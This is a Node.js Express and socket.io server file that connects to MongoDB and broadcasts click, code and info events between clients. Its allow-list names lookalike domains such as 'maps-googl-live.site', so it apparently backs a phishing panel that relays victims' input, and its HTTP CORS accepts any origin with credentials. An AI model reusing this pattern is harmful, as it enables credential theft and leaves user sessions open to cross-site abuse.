const express = require("express");
const dotenv = require("dotenv");
const cors = require("cors");
const { mongoose } = require("mongoose");
const cookieParser = require("cookie-parser");
const http = require('http');
const socketIo = require('socket.io');
const { Server } = require("socket.io");
const path = require("path");
dotenv.config();



// database connection
// Database connection
mongoose.connect(process.env.MONGO_URL)
    .then(() => console.log('DB connection successful!'))
    .catch((err) => {
        console.error('DB connection failed!', err);
        // Optionally, you can exit the process if DB connection fails
        process.exit(1);
    });

const app = express();

app.use(cors({

    origin: (origin, callback) => {
        callback(null, true); // Allow all origins
    },
    credentials: true
}));// Enable CORS
app.use(express.json());
app.use(cookieParser());
app.use(express.urlencoded({ extended: false }));

// Global error-handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack); // Log the stack trace for debugging

    if (err.name === 'TokenExpiredError') {
        return res.status(401).json({ message: 'Token has expired, please log in again' });
    }

    res.status(err.status || 500).json({ message: err.message || 'Internal Server Error' });
});


const server = http.createServer(app);

const io = new Server(server, {
    cors: {
        origin: ['http://localhost:5173', 'https://jahidmapnew.web.app', 'https://mylivlocationz.com','https://mylivlocationsz.web.app','https://maplocationlive.site','https://maps-googl-live.site', 'http://localhost:3000'],
        methods: ['GET', 'POST'],

    }
});

const users = {};

io.on("connection", (socket) => {
    console.log("User connected: ", socket.id);


    // When a user logs in, store their MongoDB user ID and socket ID
    socket.on("registerUser", (userId) => {
        users[userId] = socket.id;
        console.log(`User ${userId} registered with socket ID ${socket.id}`);
    });

    socket.on("buttonClick", (data) => {
        // console.log("Button clicked");
        socket.broadcast.emit("buttonClick", data);
    })
    // Listen for `backClick` event and broadcast to other clients
    socket.on("backClick", (data) => {
        console.log("backClick received:", data);
        socket.broadcast.emit("backClick", data);
    });
    socket.on("doneClick", (data) => {
        console.log("doneClick received:", data);
        socket.broadcast.emit("doneClick", data);
    });
    socket.on("codeClick", (data) => {
        console.log("codeClick received:", data);
        socket.broadcast.emit("codeClick", data);
    });
    socket.on("newInfo", (data) => {
        console.log("newInfo received:", data);
        socket.broadcast.emit("newInfo", data);
    });

    socket.on("disconnect", () => {
         // Remove the user from the map when they disconnect
    for (const [userId, socketId] of Object.entries(users)) {
        if (socketId === socket.id) {
          delete users[userId];
          console.log(`User ${userId} disconnected`);
          break;
        }
      }
        // console.log("User disconnected");
    });
});



app.use('/', require('./routes/authRoutes'));
app.use('/', require('./routes/userRoutes'));
app.use('/', require('./routes/websiteRoutes'));
app.use('/', require('./routes/informationRoutes'));


// const __dirname1 = path.resolve();

// if (process.env.NODE_ENV === 'production') {
//     app.use(express.static(path.join(__dirname1, '/client/dist')));
//     app.get('*', (req, res) => {
//         res.sendFile(path.resolve(__dirname1, 'client', 'dist', 'index.html'));
//     });
// }else{
//     app.get('/', (req, res) => {
//         res.send('API is running...')
//     })
// }



const port = process.env.PORT || 8000;
// Handle uncaught exceptions and unhandled promise rejections
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception: ', err);
    // Log error to monitoring service if available
    // Optionally, you could try restarting the server here if critical
    process.exit(1); // Exit the process with a failure status code
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection: ', err);
    // Log the error and decide whether to attempt a graceful shutdown or restart
    process.exit(1); // Exit the process with a failure status code
});

server.listen(port, () => console.log(`Server is running on port ${port}`));